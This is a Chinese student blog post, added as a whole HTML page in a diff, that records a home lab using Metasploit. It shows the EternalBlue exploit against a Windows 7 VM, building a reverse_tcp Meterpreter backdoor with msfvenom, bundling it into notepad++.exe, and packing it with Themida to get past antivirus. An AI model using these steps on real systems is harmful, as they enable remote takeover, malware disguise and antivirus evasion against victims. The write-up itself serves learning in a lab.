@@ -1,0 +1,308 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Metasploit的简单使用 | Jughead YQQ</title><meta name="keywords" content="Metasploit"><meta name="author" content="Jughead YQQ"><meta name="copyright" content="Jughead YQQ"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Metasploit的简单使用">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Metasploit的简单使用">
+<meta property="og:url" content="https://jason177.com/2021/12/09/metasploit/index.html">
+<meta property="og:site_name" content="Jughead YQQ">
+<meta property="og:description" content="Metasploit的简单使用">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/xssqg/image/202112092208882.pngM">
+<meta property="article:published_time" content="2021-12-09T14:05:53.000Z">
+<meta property="article:modified_time" content="2021-12-09T14:10:53.000Z">
+<meta property="article:author" content="Jughead YQQ">
+<meta property="article:tag" content="Metasploit">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/xssqg/image/202112092208882.pngM"><link rel="shortcut icon" href="https://cdn.jsdelivr.net/gh/xssqg/image/1.jpeg"><link rel="canonical" href="https://jason177.com/2021/12/09/metasploit/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//www.google-analytics.com" crossorigin=""/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="IspIaguCg9O4W3zWyG50FDPiJbz9XorXelabPha7i38"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script async="async" src="https://www.googletagmanager.com/gtag/js?id=G-3ERYSKYBLP"></script><script>window.dataLayer = window.dataLayer || [];
+function gtag(){dataLayer.push(arguments);}
+gtag('js', new Date());
+gtag('config', 'G-3ERYSKYBLP');
+</script><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":230},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Metasploit的简单使用',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-12-09 22:10:53'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Jughead YQQ" type="application/atom+xml">
+</head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://cdn.jsdelivr.net/gh/xssqg/image/1.jpeg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">7</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">6</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 生活</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li><li><a class="site-page child" href="/shuoshuo"><i class="fa-fw far fa-comment-dots"></i><span> 说说</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-trophy"></i><span> CTF平台</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" target="_blank" rel="noopener" href="https://ctf.bugku.com/"><i class="fa-fw fas fa-dice-one"></i><span> Bugku</span></a></li><li><a class="site-page child" target="_blank" rel="noopener" href="https://www.ctfhub.com/"><i class="fa-fw fas fa-dice-two"></i><span> CTFHub</span></a></li><li><a class="site-page child" target="_blank" rel="noopener" href="https://www.xctf.org.cn/"><i class="fa-fw fas fa-dice-three"></i><span> XCTF</span></a></li><li><a class="site-page child" target="_blank" rel="noopener" href="https://www.ichunqiu.com/battalion?t=1"><i class="fa-fw fas fa-dice-four"></i><span> i春秋</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw far fa-comments"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/gh/xssqg/image/202112092208882.pngM')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Jughead YQQ</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 生活</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li><li><a class="site-page child" href="/shuoshuo"><i class="fa-fw far fa-comment-dots"></i><span> 说说</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-trophy"></i><span> CTF平台</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" target="_blank" rel="noopener" href="https://ctf.bugku.com/"><i class="fa-fw fas fa-dice-one"></i><span> Bugku</span></a></li><li><a class="site-page child" target="_blank" rel="noopener" href="https://www.ctfhub.com/"><i class="fa-fw fas fa-dice-two"></i><span> CTFHub</span></a></li><li><a class="site-page child" target="_blank" rel="noopener" href="https://www.xctf.org.cn/"><i class="fa-fw fas fa-dice-three"></i><span> XCTF</span></a></li><li><a class="site-page child" target="_blank" rel="noopener" href="https://www.ichunqiu.com/battalion?t=1"><i class="fa-fw fas fa-dice-four"></i><span> i春秋</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw far fa-comments"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Metasploit的简单使用</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-12-09T14:05:53.000Z" title="发表于 2021-12-09 22:05:53">2021-12-09</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-12-09T14:10:53.000Z" title="更新于 2021-12-09 22:10:53">2021-12-09</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Kali/">Kali</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">1.6k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>6分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Metasploit的简单使用"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/2021/12/09/metasploit/#post-comment"><span id="twikoo-count"></span></a></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h1><p>msf(metasploit framework)是一款开源安全漏洞利用和测试工具，集成了各种平台上常见的溢出漏洞和流行的shellcode，并持续保持更新。</p>
+<p>kali控制台输入msfconsole即可进入msf</p>
+<p>msf使用法则：</p>
+<ol>
+<li>使用模块(use)</li>
+<li>配置模块必选项(set)</li>
+<li>运行模块(run)</li>
+</ol>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112091313778.png" alt="image-20211209131307626"></p>
+<h2 id="永恒之蓝利用"><a href="#永恒之蓝利用" class="headerlink" title="永恒之蓝利用"></a>永恒之蓝利用</h2><p>微软会把每年的漏洞按序号排序，比如永恒之蓝的漏洞代号为<strong>ms17_010</strong>(表示Microsoft 2017年的第十个漏洞)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># msfconsole         //进入metasploit</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; search ms17_010    //查看漏洞信息</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112091330903.png" alt="image-20211209133016641"></p>
+<h3 id="1-使用模块"><a href="#1-使用模块" class="headerlink" title="1.使用模块"></a>1.使用模块</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/windows/smb/ms17_010_eternalblue</span><br></pre></td></tr></table></figure>
+
+<p>或者</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use 0</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112091331081.png" alt="image-20211209133137982"></p>
+<p>没有配置payload的值，默认使用windows/x64/meterpreter/reverse_tcp，如果默认不是这个，我们可以自己设置(set payload windows/x64/meterpreter/reverse_tcp)</p>
+<h3 id="2-配置必选项"><a href="#2-配置必选项" class="headerlink" title="2.配置必选项"></a>2.配置必选项</h3><p>先查看配置项</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; show options</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112091334790.png" alt="image-20211209133418508"></p>
+<p>这里要设置我们要攻击的主机(RHOSTS)，永恒之蓝的远程攻击端口为445，下面的LHOST是我们的kali主机的ip，LPORT为监听端口(可以自定义修改，1~65535端口，只要没有端口冲突就行)</p>
+<blockquote>
+<p>exploit:漏洞攻击脚本(比如火箭)</p>
+<p>payload:攻击载荷(火箭上的卫星，起实际作用的部分)</p>
+</blockquote>
+<p>查看win7的ip为：192.168.29.140</p>
+<p>则我们在kali的msf6命令行中输入(能一次性set，比如set RHOSTS=192.168.29.140 LPORT=10000)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set RHOSTS 192.168.29.140</span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set lport 10000</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112091345935.png" alt="image-20211209134501524"></p>
+<h3 id="3-运行模块"><a href="#3-运行模块" class="headerlink" title="3.运行模块"></a>3.运行模块</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; run</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112091346176.png" alt="image-20211209134659007"></p>
+<p>已经得到了win7的控制</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112091351905.png" alt="image-20211209135151799"></p>
+<p>这里我们可以输入shell进入cmd</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112091501782.png" alt="image-20211209150157592"></p>
+<p>exit 退出，而且攻击是实时的 如果对方关机了就不行了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112091408205.png" alt="image-20211209140802143"></p>
+<h2 id="生成后门msfvenom"><a href="#生成后门msfvenom" class="headerlink" title="生成后门msfvenom"></a>生成后门msfvenom</h2><p>这个没有利用漏洞，而是利用木马后门</p>
+<h3 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h3><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112091422484.png" alt="image-20211209142238181"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.29.137 LPORT=10000 -f exe -o /root/demo.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112091427877.png" alt="image-20211209142716737"></p>
+<p>然后目录下可以找到demo.exe这个文件</p>
+<p>然后我们继续在kali使用模块</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/multi/handlermsf6 exploit(multi/handler) &gt; show options  //查看配置必选项msf6 exploit(multi/handler) &gt; set lhost 192.168.29.137   //设置kali主机的ipmsf6 exploit(multi/handler) &gt; set lport 10000            //设置监听端口msf6 exploit(multi/handler) &gt; run 					     //开始监听，等待...</span><br></pre></td></tr></table></figure>
+
+<p>然后把demo.exe文件复制给win7，并且win7运行</p>
+<p>然后发现报错了…</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112091440949.png" alt="image-20211209144045870"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112091441120.png" alt="image-20211209144101008"></p>
+<p>看了下sessions，发现本地主机和远程主机的ip与端口都没毛病…</p>
+<p>然后再show options，发现</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112091439003.png" alt="image-20211209143948836"></p>
+<p>这个payload和前面创建demo.exe设置的payload不是同一个(<a target="_blank" rel="noopener" href="https://blog.csdn.net/zhang35/article/details/105675341">解决方法</a>)，所以我们需要：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112091443593.png" alt="image-20211209144313365"></p>
+<p>连接成功</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112091526505.png" alt="image-20211209152636124"></p>
+<p>…攻击了我的物理机，监听了我的摄像头….</p>
+<hr>
+<h3 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h3><p>所以生成远程木马后门的主要流程为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.29.137 LPORT=10000 -f exe -o /root/demo.exemsf6 &gt; use exploit/multi/handlermsf6 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcpmsf6 exploit(multi/handler) &gt; show options  //查看配置必选项msf6 exploit(multi/handler) &gt; set lhost 192.168.29.137   //设置kali主机的ipmsf6 exploit(multi/handler) &gt; set lport 10000            //设置监听端口msf6 exploit(multi/handler) &gt; run 					     //开始监听，等待...</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="免杀"><a href="#免杀" class="headerlink" title="免杀"></a>免杀</h2><h3 id="捆绑其它软件exe"><a href="#捆绑其它软件exe" class="headerlink" title="捆绑其它软件exe"></a>捆绑其它软件exe</h3><p>下载一个软件比如notepad++，然后</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.29.137 LPORT=10000 -x notepad++.exe -f exe -o demo01.exe</span><br></pre></td></tr></table></figure>
+
+<p>主要是-x参数，这里把demo01.exe捆绑在notepad++.exe上了，然后保存在root目录下，名字为demo01.exe且看起来是notepad++的图标</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112091556127.png" alt="image-20211209155657005"></p>
+<p>然后一通设置之后…</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/multi/handlermsf6 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcpmsf6 exploit(multi/handler) &gt; show options  //查看配置必选项msf6 exploit(multi/handler) &gt; set lhost 192.168.29.137   //设置kali主机的ipmsf6 exploit(multi/handler) &gt; set lport 10000            //设置监听端口msf6 exploit(multi/handler) &gt; run 					     //开始监听，等待...</span><br></pre></td></tr></table></figure>
+
+<p>然后打开了win10自带的病毒查杀，但是没有查到威胁…</p>
+<p>然后运行了一遍，发现控制不了靶机…一度怀疑我的metasploit或者端口号出现了问题，但是换了个端口还是不行，然后我再用之前实验(demo.exe)控制发现可以…就免杀的exe控制不了，所以估计是这个免杀方法用不了，而且如果杀毒软件是火绒的话是会被杀掉的</p>
+<h3 id="加壳"><a href="#加壳" class="headerlink" title="加壳"></a>加壳</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.29.137 LPORT=10000 -f exe -o demo01.exemsf6 &gt; use exploit/multi/handlermsf6 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcpmsf6 exploit(multi/handler) &gt; show options  //查看配置必选项msf6 exploit(multi/handler) &gt; set lhost 192.168.29.137   //设置kali主机的ipmsf6 exploit(multi/handler) &gt; set lport 10000            //设置监听端口msf6 exploit(multi/handler) &gt; run 					     //开始监听，等待...</span><br></pre></td></tr></table></figure>
+
+<p>加壳有压缩壳和加密壳，加壳是为了不让软件被别人反编译然后抄袭。kali中有upx可以进行脱壳和加壳，然后我先用的kali中的upx工具来把demo01.exe加壳…但是我加壳之后还是被杀了…</p>
+<p>之后下载了Themida(<a target="_blank" rel="noopener" href="https://www.52pojie.cn/thread-1217750-1-1.html">Themida下载链接</a>)，把demo01.exe从kali拖出来，然后再拖进脱壳32位软件的Themida</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112091941194.png" alt="image-20211209194101010"></p>
+<p>然后会生成一个demo01_protected.exe的文件，这个就是加壳的demo01.exe。加密后重新打开win10自带的病毒防护，病毒查到了demo01.exe是木马，但是没有查到demo01_protected.exe，说明加壳确实是<strong>可以绕过病毒防护和某些杀毒软件</strong>的(即将打脸)</p>
+<p>然后双击demo01_protected.exe</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112092002752.png" alt="image-20211209200248681"></p>
+<p>虽然连得上，但是当你输入命令的时候，win10的病毒防护还是会弹出病毒提示</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112091955422.png" alt="image-20211209195513306"></p>
+<p>目测是因为你输入的命令在win10后台运行的时候被检测到并且定位到可执行文件并隔离(删除)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112092001827.png" alt="image-20211209200134764"></p>
+<p>妈呀…真是打脸哈哈哈哈。但是好像这个方法确实可以过腾讯管家和火绒，但是过不了360和win10的病毒防护</p>
+<h2 id="想要获取hash值"><a href="#想要获取hash值" class="headerlink" title="想要获取hash值"></a>想要获取hash值</h2><p>当我在meterpreter控制台中输入hashdump的时候，meterpreter提示我</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrectpriv_passwd_get_sam_hashes:操作失败：参数不正确</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112092150708.png" alt="image-20211209215054601"></p>
+<p>getsystem也提示我全身不足</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getuid         //获取当前用户名称</span><br></pre></td></tr></table></figure>
+
+<p>好像确实是普通用户诶…当我根据<a target="_blank" rel="noopener" href="https://hackergu.com/metasploit-%E6%9D%83%E9%99%90%E4%B8%8Ehashdump%E4%B9%8B%E9%97%B4%E7%9A%84%E8%AE%A4%E8%AF%86/">这篇文章</a>尝试使用exp绕过win10的UAC之后，又提示我</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SESSION may not be compatible with this module (missing Meterpreter features: stdapi_sys_process_set_term_size)SESSION 可能与此模块不兼容（缺少 Meterpreter 功能：stdapi_sys_process_set</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112092157089.png" alt="image-20211209215755958"></p>
+<p>淦…已经晚上十点了…我还是回宿舍洗个澡有空再研究吧</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">YQQ</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://jason177.com/2021/12/09/metasploit/">https://jason177.com/2021/12/09/metasploit/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://jason177.com" target="_blank">Jughead YQQ</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Metasploit/">Metasploit</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/xssqg/image/202112092208882.pngM" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button button--animated"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="https://cdn.jsdelivr.net/gh/xssqg/image/202109261620173.jpg" target="_blank"><img class="post-qr-code-img" src="https://cdn.jsdelivr.net/gh/xssqg/image/202109261620173.jpg" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://cdn.jsdelivr.net/gh/xssqg/image/202109261624241.jpg" target="_blank"><img class="post-qr-code-img" src="https://cdn.jsdelivr.net/gh/xssqg/image/202109261624241.jpg" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-full"><a href="/2021/12/03/hdb2021/"><img class="prev-cover" src="https://cdn.jsdelivr.net/gh/xssqg/image/202112031336772.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">2021年黑盾杯wp</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://cdn.jsdelivr.net/gh/xssqg/image/1.jpeg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Jughead YQQ</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">7</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">6</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div></div><a class="button--animated" 